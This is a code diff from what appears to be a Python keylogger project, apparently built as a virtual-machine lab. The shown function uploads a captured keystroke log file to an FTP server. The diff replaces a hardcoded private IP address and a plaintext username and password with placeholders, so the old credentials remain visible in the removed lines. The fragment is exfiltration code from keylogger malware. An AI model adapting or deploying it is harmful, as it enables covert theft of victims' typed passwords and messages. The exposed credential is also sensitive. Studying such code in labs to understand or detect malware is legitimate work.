@@ -13,9 +13,9 @@ file = "keylogs.txt"
 def exfiltrate_file(file):
 	try:
 		# Connect to the FTP server hosted on the Ubuntu VM
-		ftp = FTP("10.0.0.58")
-		# Log in with user credentials (vmuser)
-		ftp.login("vmuser", "ab12cd34")
+		ftp = FTP("YOUR_UBUNTU_IP")
+		# Log in with user credentials
+		ftp.login("UBUNTU_USERNAME", "PASSWORD")
 		 # Open the log file in binary mode and upload it
 		with open(file, "rb") as f:
 			ftp.storbinary(f"STOR {file}", f)
